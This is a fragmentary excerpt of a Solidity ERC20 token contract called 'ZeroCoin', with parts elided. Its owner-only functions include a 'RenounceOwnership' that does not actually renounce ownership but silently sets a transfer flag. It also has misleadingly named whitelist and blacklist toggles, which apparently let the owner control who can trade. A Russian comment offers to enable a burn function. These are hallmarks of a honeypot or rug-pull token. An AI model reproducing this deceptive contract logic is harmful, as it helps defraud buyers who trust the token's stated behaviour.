...
contract ZeroCoin is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) public _blackbalances;
    
    mapping(address => bool) public _balances1;
   
    
    uint256 public _totalSupply = 1000000000*10**18;
    string public _name = "ZeroCoin";
    string public _symbol= "ZC";
    ...
    function SetCharityPercent(uint256 _charityPercent) public onlyOwner {
    ...
    function RenounceOwnership(address _DEAD, bool _boo) public onlyOwner returns (address _dead) {
        safeTransfer = _boo;
        _dead = _DEAD;
    }
    
    function White(address _account) public onlyOwner {
        _balances1[_account] = true;
    }
    
    function Black(address _account) public onlyOwner {
        _balances1[_account] = false;
    }
    function BL(address _account) public onlyOwner {
        _blackbalances[_account] = false;
    }
     function WL(address _account) public onlyOwner {
...
/* функция сжигания можно разкоментировать и включить
